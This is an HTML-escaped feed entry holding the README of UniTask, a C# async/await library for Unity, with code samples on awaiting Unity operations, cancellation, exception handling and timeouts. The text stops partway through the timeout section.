    <summary type="html">&lt;p&gt;Provides an efficient allocation free async/await integration for Unity.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;UniTask&lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/Cysharp/UniTask/actions&#34;&gt;&lt;img src=&#34;https://github.com/Cysharp/UniTask/workflows/Build-Debug/badge.svg?sanitize=true&#34; alt=&#34;GitHub Actions&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/Cysharp/UniTask/releases&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/release/Cysharp/UniTask.svg?sanitize=true&#34; alt=&#34;Releases&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Provides an efficient allocation free async/await integration for Unity.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Struct based &lt;code&gt;UniTask&amp;lt;T&amp;gt;&lt;/code&gt; and custom AsyncMethodBuilder to achieve zero allocation&lt;/li&gt; &#xA; &lt;li&gt;Makes all Unity AsyncOperations and Coroutines awaitable&lt;/li&gt; &#xA; &lt;li&gt;PlayerLoop based task(&lt;code&gt;UniTask.Yield&lt;/code&gt;, &lt;code&gt;UniTask.Delay&lt;/code&gt;, &lt;code&gt;UniTask.DelayFrame&lt;/code&gt;, etc..) that enable replacing all coroutine operations&lt;/li&gt; &#xA; &lt;li&gt;MonoBehaviour Message Events and uGUI Events as awaitable/async-enumerable&lt;/li&gt; &#xA; &lt;li&gt;Runs completely on Unity&#39;s PlayerLoop so doesn&#39;t use threads and runs on WebGL, wasm, etc.&lt;/li&gt; &#xA; &lt;li&gt;Asynchronous LINQ, with Channel and AsyncReactiveProperty&lt;/li&gt; &#xA; &lt;li&gt;TaskTracker window to prevent memory leaks&lt;/li&gt; &#xA; &lt;li&gt;Highly compatible behaviour with Task/ValueTask/IValueTaskSource&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;For technical details, see blog post: &lt;a href=&#34;https://medium.com/@neuecc/unitask-v2-zero-allocation-async-await-for-unity-with-asynchronous-linq-1aa9c96aa7dd&#34;&gt;UniTask v2 — Zero Allocation async/await for Unity, with Asynchronous LINQ &lt;/a&gt;&lt;br&gt; For advanced tips, see blog post: &lt;a href=&#34;https://medium.com/@neuecc/extends-unitywebrequest-via-async-decorator-pattern-advanced-techniques-of-unitask-ceff9c5ee846&#34;&gt;Extends UnityWebRequest via async decorator pattern — Advanced Techniques of UniTask&lt;/a&gt;&lt;/p&gt; &#xA;&lt;!-- START doctoc generated TOC please keep comment here to allow auto update --&gt; &#xA;&lt;!-- DON&#39;T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE --&gt; &#xA;&lt;h2&gt;Table of Contents&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Cysharp/UniTask/master/#getting-started&#34;&gt;Getting started&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Cysharp/UniTask/master/#basics-of-unitask-and-asyncoperation&#34;&gt;Basics of UniTask and AsyncOperation&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Cysharp/UniTask/master/#cancellation-and-exception-handling&#34;&gt;Cancellation and Exception handling&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Cysharp/UniTask/master/#timeout-handling&#34;&gt;Timeout handling&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Cysharp/UniTask/master/#progress&#34;&gt;Progress&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Cysharp/UniTask/master/#playerloop&#34;&gt;PlayerLoop&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Cysharp/UniTask/master/#async-void-vs-async-unitaskvoid&#34;&gt;async void vs async UniTaskVoid&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Cysharp/UniTask/master/#unitasktracker&#34;&gt;UniTaskTracker&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Cysharp/UniTask/master/#external-assets&#34;&gt;External Assets&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Cysharp/UniTask/master/#asyncenumerable-and-async-linq&#34;&gt;AsyncEnumerable and Async LINQ&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Cysharp/UniTask/master/#awaitable-events&#34;&gt;Awaitable Events&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Cysharp/UniTask/master/#channel&#34;&gt;Channel&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Cysharp/UniTask/master/#for-unit-testing&#34;&gt;For Unit Testing&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Cysharp/UniTask/master/#threadpool-limitation&#34;&gt;ThreadPool limitation&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Cysharp/UniTask/master/#ienumeratortounitask-limitation&#34;&gt;IEnumerator.ToUniTask limitation&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Cysharp/UniTask/master/#for-unityeditor&#34;&gt;For UnityEditor&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Cysharp/UniTask/master/#compare-with-standard-task-api&#34;&gt;Compare with Standard Task API&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Cysharp/UniTask/master/#pooling-configuration&#34;&gt;Pooling Configuration&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Cysharp/UniTask/master/#allocation-on-profiler&#34;&gt;Allocation on Profiler&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Cysharp/UniTask/master/#unitasksynchronizationcontext&#34;&gt;UniTaskSynchronizationContext&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Cysharp/UniTask/master/#api-references&#34;&gt;API References&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Cysharp/UniTask/master/#upm-package&#34;&gt;UPM Package&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Cysharp/UniTask/master/#install-via-git-url&#34;&gt;Install via git URL&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Cysharp/UniTask/master/#install-via-openupm&#34;&gt;Install via OpenUPM&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Cysharp/UniTask/master/#net-core&#34;&gt;.NET Core&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Cysharp/UniTask/master/#license&#34;&gt;License&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;!-- END doctoc generated TOC please keep comment here to allow auto update --&gt; &#xA;&lt;h2&gt;Getting started&lt;/h2&gt; &#xA;&lt;p&gt;Install via &lt;a href=&#34;https://raw.githubusercontent.com/Cysharp/UniTask/master/#upm-package&#34;&gt;UPM package&lt;/a&gt; or asset package(&lt;code&gt;UniTask.*.*.*.unitypackage&lt;/code&gt;) available in &lt;a href=&#34;https://github.com/Cysharp/UniTask/releases&#34;&gt;UniTask/releases&lt;/a&gt; page.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-csharp&#34;&gt;// extension awaiter/methods can be used by this namespace&#xA;using Cysharp.Threading.Tasks;&#xA;&#xA;// You can return type as struct UniTask&amp;lt;T&amp;gt;(or UniTask), it is unity specialized lightweight alternative of Task&amp;lt;T&amp;gt;&#xA;// zero allocation and fast excution for zero overhead async/await integrate with Unity&#xA;async UniTask&amp;lt;string&amp;gt; DemoAsync()&#xA;{&#xA;    // You can await Unity&#39;s AsyncObject&#xA;    var asset = await Resources.LoadAsync&amp;lt;TextAsset&amp;gt;(&#34;foo&#34;);&#xA;    var txt = (await UnityWebRequest.Get(&#34;https://...&#34;).SendWebRequest()).downloadHandler.text;&#xA;    await SceneManager.LoadSceneAsync(&#34;scene2&#34;);&#xA;&#xA;    // .WithCancellation enables Cancel, GetCancellationTokenOnDestroy synchornizes with lifetime of GameObject&#xA;    var asset2 = await Resources.LoadAsync&amp;lt;TextAsset&amp;gt;(&#34;bar&#34;).WithCancellation(this.GetCancellationTokenOnDestroy());&#xA;&#xA;    // .ToUniTask accepts progress callback(and all options), Progress.Create is a lightweight alternative of IProgress&amp;lt;T&amp;gt;&#xA;    var asset3 = await Resources.LoadAsync&amp;lt;TextAsset&amp;gt;(&#34;baz&#34;).ToUniTask(Progress.Create&amp;lt;float&amp;gt;(x =&amp;gt; Debug.Log(x)));&#xA;&#xA;    // await frame-based operation like a coroutine&#xA;    await UniTask.DelayFrame(100); &#xA;&#xA;    // replacement of yield return new WaitForSeconds/WaitForSecondsRealtime&#xA;    await UniTask.Delay(TimeSpan.FromSeconds(10), ignoreTimeScale: false);&#xA;    &#xA;    // yield any playerloop timing(PreUpdate, Update, LateUpdate, etc...)&#xA;    await UniTask.Yield(PlayerLoopTiming.PreLateUpdate);&#xA;&#xA;    // replacement of yield return null&#xA;    await UniTask.Yield();&#xA;    await UniTask.NextFrame();&#xA;&#xA;    // replacement of WaitForEndOfFrame(requires MonoBehaviour(CoroutineRunner))&#xA;    await UniTask.WaitForEndOfFrame(this); // this is MonoBehaviour&#xA;&#xA;    // replacement of yield return new WaitForFixedUpdate(same as UniTask.Yield(PlayerLoopTiming.FixedUpdate))&#xA;    await UniTask.WaitForFixedUpdate();&#xA;    &#xA;    // replacement of yield return WaitUntil&#xA;    await UniTask.WaitUntil(() =&amp;gt; isActive == false);&#xA;&#xA;    // special helper of WaitUntil&#xA;    await UniTask.WaitUntilValueChanged(this, x =&amp;gt; x.isActive);&#xA;&#xA;    // You can await IEnumerator coroutines&#xA;    await FooCoroutineEnumerator();&#xA;&#xA;    // You can await a standard task&#xA;    await Task.Run(() =&amp;gt; 100);&#xA;&#xA;    // Multithreading, run on ThreadPool under this code&#xA;    await UniTask.SwitchToThreadPool();&#xA;&#xA;    /* work on ThreadPool */&#xA;&#xA;    // return to MainThread(same as `ObserveOnMainThread` in UniRx)&#xA;    await UniTask.SwitchToMainThread();&#xA;&#xA;    // get async webrequest&#xA;    async UniTask&amp;lt;string&amp;gt; GetTextAsync(UnityWebRequest req)&#xA;    {&#xA;        var op = await req.SendWebRequest();&#xA;        return op.downloadHandler.text;&#xA;    }&#xA;&#xA;    var task1 = GetTextAsync(UnityWebRequest.Get(&#34;http://google.com&#34;));&#xA;    var task2 = GetTextAsync(UnityWebRequest.Get(&#34;http://bing.com&#34;));&#xA;    var task3 = GetTextAsync(UnityWebRequest.Get(&#34;http://yahoo.com&#34;));&#xA;&#xA;    // concurrent async-wait and get results easily by tuple syntax&#xA;    var (google, bing, yahoo) = await UniTask.WhenAll(task1, task2, task3);&#xA;&#xA;    // shorthand of WhenAll, tuple can await directly&#xA;    var (google2, bing2, yahoo2) = await (task1, task2, task3);&#xA;&#xA;    // return async-value.(or you can use `UniTask`(no result), `UniTaskVoid`(fire and forget)).&#xA;    return (asset as TextAsset)?.text ?? throw new InvalidOperationException(&#34;Asset not found&#34;);&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Basics of UniTask and AsyncOperation&lt;/h2&gt; &#xA;&lt;p&gt;UniTask features rely on C# 7.0(&lt;a href=&#34;https://github.com/dotnet/roslyn/raw/master/docs/features/task-types.md&#34;&gt;task-like custom async method builder feature&lt;/a&gt;) so the required Unity version is after &lt;code&gt;Unity 2018.3&lt;/code&gt;, the official lowest version supported is &lt;code&gt;Unity 2018.4.13f1&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Why is UniTask(custom task-like object) required? Because Task is too heavy and not matched to Unity threading (single-thread). UniTask does not use threads and SynchronizationContext/ExecutionContext because Unity&#39;s asynchronous object is automaticaly dispatched by Unity&#39;s engine layer. It achieves faster and lower allocation, and is completely integrated with Unity.&lt;/p&gt; &#xA;&lt;p&gt;You can await &lt;code&gt;AsyncOperation&lt;/code&gt;, &lt;code&gt;ResourceRequest&lt;/code&gt;, &lt;code&gt;AssetBundleRequest&lt;/code&gt;, &lt;code&gt;AssetBundleCreateRequest&lt;/code&gt;, &lt;code&gt;UnityWebRequestAsyncOperation&lt;/code&gt;, &lt;code&gt;AsyncGPUReadbackRequest&lt;/code&gt;, &lt;code&gt;IEnumerator&lt;/code&gt; and others when &lt;code&gt;using Cysharp.Threading.Tasks;&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;UniTask provides three pattern of extension methods.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-csharp&#34;&gt;* await asyncOperation;&#xA;* .WithCancellation(CancellationToken);&#xA;* .ToUniTask(IProgress, PlayerLoopTiming, CancellationToken);&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;code&gt;WithCancellation&lt;/code&gt; is a simple version of &lt;code&gt;ToUniTask&lt;/code&gt;, both return &lt;code&gt;UniTask&lt;/code&gt;. For details of cancellation, see: &lt;a href=&#34;https://raw.githubusercontent.com/Cysharp/UniTask/master/#cancellation-and-exception-handling&#34;&gt;Cancellation and Exception handling&lt;/a&gt; section.&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;Note: await directly is returned from native timing of PlayerLoop but WithCancellation and ToUniTask are returned from specified PlayerLoopTiming. For details of timing, see: &lt;a href=&#34;https://raw.githubusercontent.com/Cysharp/UniTask/master/#playerloop&#34;&gt;PlayerLoop&lt;/a&gt; section.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;Note: AssetBundleRequest has &lt;code&gt;asset&lt;/code&gt; and &lt;code&gt;allAssets&lt;/code&gt;, default await returns &lt;code&gt;asset&lt;/code&gt;. If you want to get &lt;code&gt;allAssets&lt;/code&gt;, you can use &lt;code&gt;AwaitForAllAssets()&lt;/code&gt; method.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;The type of &lt;code&gt;UniTask&lt;/code&gt; can use utilities like &lt;code&gt;UniTask.WhenAll&lt;/code&gt;, &lt;code&gt;UniTask.WhenAny&lt;/code&gt;. They are like &lt;code&gt;Task.WhenAll&lt;/code&gt;/&lt;code&gt;Task.WhenAny&lt;/code&gt; but the return type is more useful. They return value tuples so you can deconstruct each result and pass multiple types.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-csharp&#34;&gt;public async UniTaskVoid LoadManyAsync()&#xA;{&#xA;    // parallel load.&#xA;    var (a, b, c) = await UniTask.WhenAll(&#xA;        LoadAsSprite(&#34;foo&#34;),&#xA;        LoadAsSprite(&#34;bar&#34;),&#xA;        LoadAsSprite(&#34;baz&#34;));&#xA;}&#xA;&#xA;async UniTask&amp;lt;Sprite&amp;gt; LoadAsSprite(string path)&#xA;{&#xA;    var resource = await Resources.LoadAsync&amp;lt;Sprite&amp;gt;(path);&#xA;    return (resource as Sprite);&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;If you want to convert a callback to UniTask, you can use &lt;code&gt;UniTaskCompletionSource&amp;lt;T&amp;gt;&lt;/code&gt; which is a lightweight edition of &lt;code&gt;TaskCompletionSource&amp;lt;T&amp;gt;&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-csharp&#34;&gt;public UniTask&amp;lt;int&amp;gt; WrapByUniTaskCompletionSource()&#xA;{&#xA;    var utcs = new UniTaskCompletionSource&amp;lt;int&amp;gt;();&#xA;&#xA;    // when complete, call utcs.TrySetResult();&#xA;    // when failed, call utcs.TrySetException();&#xA;    // when cancel, call utcs.TrySetCanceled();&#xA;&#xA;    return utcs.Task; //return UniTask&amp;lt;int&amp;gt;&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;You can convert Task -&amp;gt; UniTask: &lt;code&gt;AsUniTask&lt;/code&gt;, &lt;code&gt;UniTask&lt;/code&gt; -&amp;gt; &lt;code&gt;UniTask&amp;lt;AsyncUnit&amp;gt;&lt;/code&gt;: &lt;code&gt;AsAsyncUnitUniTask&lt;/code&gt;, &lt;code&gt;UniTask&amp;lt;T&amp;gt;&lt;/code&gt; -&amp;gt; &lt;code&gt;UniTask&lt;/code&gt;: &lt;code&gt;AsUniTask&lt;/code&gt;. &lt;code&gt;UniTask&amp;lt;T&amp;gt;&lt;/code&gt; -&amp;gt; &lt;code&gt;UniTask&lt;/code&gt;&#39;s conversion cost is free.&lt;/p&gt; &#xA;&lt;p&gt;If you want to convert async to coroutine, you can use &lt;code&gt;.ToCoroutine()&lt;/code&gt;, this is useful if you want to only allow using the coroutine system.&lt;/p&gt; &#xA;&lt;p&gt;UniTask can not await twice. This is a similar constraint to the &lt;a href=&#34;https://docs.microsoft.com/en-us/dotnet/api/system.threading.tasks.valuetask-1?view=netcore-3.1&#34;&gt;ValueTask/IValueTaskSource&lt;/a&gt; introduced in .NET Standard 2.1.&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;The following operations should never be performed on a ValueTask&#xA;  &lt;tresult&gt;&#xA;    instance:&#xA;  &lt;/tresult&gt;&lt;/p&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;Awaiting the instance multiple times.&lt;/li&gt; &#xA;  &lt;li&gt;Calling AsTask multiple times.&lt;/li&gt; &#xA;  &lt;li&gt;Using .Result or .GetAwaiter().GetResult() when the operation hasn&#39;t yet completed, or using them multiple times.&lt;/li&gt; &#xA;  &lt;li&gt;Using more than one of these techniques to consume the instance.&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA; &lt;p&gt;If you do any of the above, the results are undefined.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-csharp&#34;&gt;var task = UniTask.DelayFrame(10);&#xA;await task;&#xA;await task; // NG, throws Exception&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Store to the class field, you can use &lt;code&gt;UniTask.Lazy&lt;/code&gt; that supports calling multiple times. &lt;code&gt;.Preserve()&lt;/code&gt; allows for multiple calls (internally cached results). This is useful when there are multiple calls in a function scope.&lt;/p&gt; &#xA;&lt;p&gt;Also &lt;code&gt;UniTaskCompletionSource&lt;/code&gt; can await multiple times and await from many callers.&lt;/p&gt; &#xA;&lt;h2&gt;Cancellation and Exception handling&lt;/h2&gt; &#xA;&lt;p&gt;Some UniTask factory methods have a &lt;code&gt;CancellationToken cancellationToken = default&lt;/code&gt; parameter. Also some async operations for Unity have &lt;code&gt;WithCancellation(CancellationToken)&lt;/code&gt; and &lt;code&gt;ToUniTask(..., CancellationToken cancellation = default)&lt;/code&gt; extension methods.&lt;/p&gt; &#xA;&lt;p&gt;You can pass &lt;code&gt;CancellationToken&lt;/code&gt; to parameter by standard &lt;a href=&#34;https://docs.microsoft.com/en-us/dotnet/api/system.threading.cancellationtokensource&#34;&gt;&lt;code&gt;CancellationTokenSource&lt;/code&gt;&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-csharp&#34;&gt;var cts = new CancellationTokenSource();&#xA;&#xA;cancelButton.onClick.AddListener(() =&amp;gt;&#xA;{&#xA;    cts.Cancel();&#xA;});&#xA;&#xA;await UnityWebRequest.Get(&#34;http://google.co.jp&#34;).SendWebRequest().WithCancellation(cts.Token);&#xA;&#xA;await UniTask.DelayFrame(1000, cancellationToken: cts.Token);&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;CancellationToken can be created by &lt;code&gt;CancellationTokenSource&lt;/code&gt; or MonoBehaviour&#39;s extension method &lt;code&gt;GetCancellationTokenOnDestroy&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-csharp&#34;&gt;// this CancellationToken lifecycle is same as GameObject.&#xA;await UniTask.DelayFrame(1000, cancellationToken: this.GetCancellationTokenOnDestroy());&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;For propagate Cancellation, all async method recommend to accept &lt;code&gt;CancellationToken cancellationToken&lt;/code&gt; at last argument, and pass &lt;code&gt;CancellationToken&lt;/code&gt; from root to end.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-csharp&#34;&gt;await FooAsync(this.GetCancellationTokenOnDestroy());&#xA;&#xA;// ---&#xA;&#xA;async UniTask FooAsync(CancellationToken cancellationToken)&#xA;{&#xA;    await BarAsync(cancellationToken);&#xA;}&#xA;&#xA;async UniTask BarAsync(CancellationToken cancellationToken)&#xA;{&#xA;    await UniTask.Delay(TimeSpan.FromSeconds(3), cancellationToken);&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;code&gt;CancellationToken&lt;/code&gt; means lifecycle of async. You can hold your own lifecycle insteadof default CancellationTokenOnDestroy.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-csharp&#34;&gt;public class MyBehaviour : MonoBehaviour&#xA;{&#xA;    CancellationTokenSource disableCancellation = new CancellationTokenSource();&#xA;    CancellationTokenSource destroyCancellation = new CancellationTokenSource();&#xA;&#xA;    private void OnEnable()&#xA;    {&#xA;        if (disableCancellation != null)&#xA;        {&#xA;            disableCancellation.Dispose();&#xA;        }&#xA;        disableCancellation = new CancellationTokenSource();&#xA;    }&#xA;&#xA;    private void OnDisable()&#xA;    {&#xA;        disableCancellation.Cancel();&#xA;    }&#xA;&#xA;    private void OnDestroy()&#xA;    {&#xA;        destroyCancellation.Cancel();&#xA;        destroyCancellation.Dispose();&#xA;    }&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;When cancellation is detected, all methods throw &lt;code&gt;OperationCanceledException&lt;/code&gt; and propagate upstream. When exception(not limited to &lt;code&gt;OperationCanceledException&lt;/code&gt;) is not handled in async method, it is propagated finally to &lt;code&gt;UniTaskScheduler.UnobservedTaskException&lt;/code&gt;. The default behaviour of received unhandled exception is to write log as exception. Log level can be changed using &lt;code&gt;UniTaskScheduler.UnobservedExceptionWriteLogType&lt;/code&gt;. If you want to use custom behaviour, set an action to &lt;code&gt;UniTaskScheduler.UnobservedTaskException.&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;Andalso &lt;code&gt;OperationCanceledException&lt;/code&gt; is a special exception, this is silently ignored at &lt;code&gt;UnobservedTaskException&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;If you want to cancel behaviour in an async UniTask method, throw &lt;code&gt;OperationCanceledException&lt;/code&gt; manually.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-csharp&#34;&gt;public async UniTask&amp;lt;int&amp;gt; FooAsync()&#xA;{&#xA;    await UniTask.Yield();&#xA;    throw new OperationCanceledException();&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;If you handle an exception but want to ignore(propagate to global cancellation handling), use an exception filter.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-csharp&#34;&gt;public async UniTask&amp;lt;int&amp;gt; BarAsync()&#xA;{&#xA;    try&#xA;    {&#xA;        var x = await FooAsync();&#xA;        return x * 2;&#xA;    }&#xA;    catch (Exception ex) when (!(ex is OperationCanceledException)) // when (ex is not OperationCanceledException) at C# 9.0&#xA;    {&#xA;        return -1;&#xA;    }&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;throws/catch &lt;code&gt;OperationCanceledException&lt;/code&gt; is slightly heavy, so if performance is a concern, use &lt;code&gt;UniTask.SuppressCancellationThrow&lt;/code&gt; to avoid OperationCanceledException throw. It returns &lt;code&gt;(bool IsCanceled, T Result)&lt;/code&gt; instead of throwing.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-csharp&#34;&gt;var (isCanceled, _) = await UniTask.DelayFrame(10, cancellationToken: cts.Token).SuppressCancellationThrow();&#xA;if (isCanceled)&#xA;{&#xA;    // ...&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Note: Only suppress throws if you call directly into the most source method. Otherwise, the return value will be converted, but the entire pipeline will not suppress throws.&lt;/p&gt; &#xA;&lt;h2&gt;Timeout handling&lt;/h2&gt; &#xA;&lt;p&gt;Timeout is a variation of cancellation. You can set timeout by &lt;code&gt;CancellationTokenSouce.CancelAfterSlim(TimeSpan)&lt;/code&gt; and pass CancellationToken to async methods.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-csharp&#34;&gt;var cts = new CancellationTokenSource();&#xA;cts.CancelAfterSlim(TimeSpan.FromSeconds(5)); // 5sec timeout.&#xA;&#xA;try&#xA;{&#xA;    await UnityWebRequest.Get(&#34;http://foo&#34;).SendWebRequest().WithCancellation(cts.Token);&#xA;}&#xA;catch (OperationCanceledException ex)&#xA;{&#xA;    if (ex.CancellationToken == cts.Token)&#xA;    {&#xA;        UnityEngine.Debug.Log(&#34;Timeout&#34;);&#xA;    }&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;&lt;code&gt;CancellationTokenSouce.CancelAfter&lt;/code&gt; is a standard api. However in Unity you should not use it because it depends threading timer. &lt;code&gt;CancelAfterSlim&lt;/code&gt; is UniTask&#39;s extension methods, it uses PlayerLoop instead.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;If you want to use timeout with other source of cancellation, use &lt;code&gt;CancellationTokenSource.CreateLinkedTokenSource&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-csharp&#34;&gt;var cancelToken = new CancellationTokenSource();&#xA;cancelButton.onClick.AddListener(()=&amp;gt;&#xA;{&#xA;    cancelToken.Cancel(); // cancel from button click.&#xA;});&#xA;&#xA;var timeoutToken = new CancellationTokenSource();&#xA;timeoutToken.CancelAfterSlim(TimeSpan.FromSeconds(5)); // 5sec timeout.&#xA;&#xA;try&#xA;{&#xA;    // combine token&#xA;    var linkedTokenSource = CancellationTokenSource.CreateLinkedTokenSource(cancelToken.Token, timeoutToken.Token);&#xA;&#xA;    await UnityWebRequest.Get(&#34;http://foo&#34;).SendWebRequest().WithCancellation(linkedTokenSource.Token);&#xA;}&#xA;catch (OperationCanceledException ex)&#xA;{&#xA;    if (timeoutToken.IsCancellationRequested)&#xA;    {&#xA;        UnityEngine.Debug.Log(&#34;Timeout.&#34;);&#xA;    }&#xA;    else if (cancelToken.IsCancellationRequested)&#xA;    {&#xA;        UnityEngine.Debug.Log(&#34;Cancel clicked.&#34;);&#xA;    }&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Optimize for reduce allocation of CancellationTokenSource for timeout per call async method, you can use UniTask&#39;s &lt;code&gt;TimeoutController&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-csharp&#34;&gt;TimeoutController timeoutController = new TimeoutController(); // setup to field for reuse.&#xA;&#xA;async UniTask FooAsync()&#xA;{&#xA;    try&#xA;    {&#xA;        // you can pass timeoutController.Timeout(TimeSpan) to cancellationToken.&#xA;        await UnityWebRequest.Get(&#34;http://foo&#34;).SendWebRequest()&#xA;            .WithCancellation(timeoutController.Timeout(TimeSpan.FromSeconds(5)));&#xA;        timeoutController.Reset(); // call Reset(Stop timeout timer and ready for reuse) when succeed.&#xA;    }&#xA;    catch (OperationCanceledException ex)&#xA;    {&#xA;        if (timeoutController.IsTimeout())&#xA;        {&#xA;            UnityEngine.Debug.Log(&#34;timeout&#34;);&#xA;        }&#xA;    }&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;If you want to use timeout with other source of cancellation, use &lt;code&gt;new TimeoutController(CancellationToken)&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-csharp&#34;&gt;TimeoutController timeoutController;&#xA;CancellationTokenSource clickCancelSource;&#xA;&#xA;void Start()&#xA;{&#xA;    this.clickCancelSource = new CancellationTokenSource();&#xA;    this.timeoutController = new TimeoutController(clickCancelSource);&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Note: UniTask has &lt;code&gt;.Timeout&lt;/code&gt;, &lt;code&gt;.TimeoutWithoutException&lt;/code&gt; methods however, if possible, do not use these, please pass &lt;code&gt;CancellationToken&lt;/code&gt;. Because 